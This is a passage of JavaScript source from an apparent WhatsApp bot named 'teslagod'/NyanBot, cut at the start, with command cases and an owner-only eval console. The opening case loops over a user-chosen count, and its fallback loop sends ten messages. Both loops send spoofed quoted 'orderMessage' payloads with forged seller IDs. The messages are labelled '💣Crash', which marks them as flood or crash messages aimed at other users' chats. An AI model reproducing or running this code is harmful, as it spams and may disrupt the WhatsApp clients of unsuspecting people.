quoted: estadouwur1
}
for (let i = 0; i < args[0]; i++) {
teslagod.sendMessage(from, options, MessageType.text, {
    quoted: {
        key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? {
                remoteJid: '51995386439@s.whatsapp.net'
            } : {})
        },
        "message": {
            "orderMessage": {
                "orderId": '5219984907794',
                "itemCount": 69,
                "status": 'INQUIRY',
                "surface": 'CATALOG',
                "orderTitle": `${pushname}`,
                "sellerJid": '51995386439@s.whatsapp.net'
            }
        }
    }
})
}
}
catch {
    for (let i = 0; i < 10; i++) {
        teslagod.sendMessage(from, '💣Crash *teslagod* NyanBot All🗡', MessageType.text, {
    quoted: {
        key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? {
                remoteJid: '51995386439@s.whatsapp.net'
            } : {})
        },
        "message": {
            "orderMessage": {
                "orderId": '51995386439',
                "itemCount": 69,
                "status": 'INQUIRY',
                "surface": 'CATALOG',
                "message": `${UwU}`,
                "orderTitle": `${pushname}`,
                "sellerJid": '51995386439@s.whatsapp.net'
            }
        }
    }
})
}
}
break
case 'test2':
grup12 = teslagod.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '573152139466-1616220327@g.us', "inviteCode": 'https://chat.whatsapp.com/BGTQNDzESmEJr2cCJlccWV', "groupName": `UwU`, "footerText": "*_© teslagod_*", "jpegThumbnail": fs.readFileSync('./multimedia/imagenes/milogohd.jpg'), "caption": UwU, "inviteCode": "yv4xLt3+eglcsUG7", "inviteExpiration": "1631410397"}}, {quoted:mek})
teslagod.relayWAMessage(grup12)
break

case 'test3':
if (isBaneado) return
teslagod.sendMessage(from, fs.readFileSync('./multimedia/imagenes/logo.png'), image, {quoted: estadouwur1, contextInfo:{externalAdReply: {title: `${pushname} 7w7r`, body: 'UwU', sourceUrl: 'https://youtube.com/channel/UC_Pp8pT9vbT15k5_-i6oseA', thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}, caption: idiomas.apoyouwu(), thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})

				reshb1 = await teslagod.prepareMessageFromContent(from, {
    "templateMessage": {
        "hydratedFourRowTemplate": {
            "hydratedContentText": '',
            "hydratedFooterText": '',
            "hydratedButtons": [{
                "urlButton": {
                    "displayText": '',
                    "url": ''
                },
                "index": 1
            }]
        },
        "hydratedTemplate": {
            "hydratedContentText": `${'Hola, Muchísimas gracias por usar mi bot mi king se te agradece un millon :3'}`,
            "hydratedFooterText": `${'NOTA: Este mensaje solo lo puedes ver tu ;3\n\nSexy El Que Lo Lea 7w7 '}`,
            "hydratedButtons": [{
                "urlButton": {
                    "displayText": `${'Granito de arena ✓'}`,
                    "url": 'https://youtube.com/channel/UC_Pp8pT9vbT15k5_-i6oseA'
                },
                "index": 0
            }]
        }
    }
}, {});
teslagod.relayWAMessage(reshb1)
await limitAdd(sender)
addLevelingXp(sender, 450)
addLevelingLevel(sender, 1)
break

      default:

if (budy.startsWith('>')){
            if (!mek.key.fromMe) return
            const util = require("util");
            konsol = budy.slice(1)
            Return = (sul) => {
            sat = JSON.stringify(sul, null, 2)
            bang = util.format(sat)
            if (sat == undefined){
            bang = util.format(sul)
            }
            return reply(bang)
            }
            try {
            reply(`${util.format(eval(`;(async () => { ${konsol} })()`))}`)
            } catch(e){
            reply(`${String(e)}`)
            }}

    }
    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("\n[Actividad en WhatsApp]", "green"),
        ":",
        color(sender.split("@")[0]+'\n')
      );
    }
   } catch (e) {
    e = String(e);// Fixed In Consolog â™¥
    if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined") && !e.includes("Cannot read property 'key' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined")) {
      console.log("Message : %s", color(e, "yellow"));
    }
    // console.log(e)
  }
};
// Endã‚·ï¸Ž
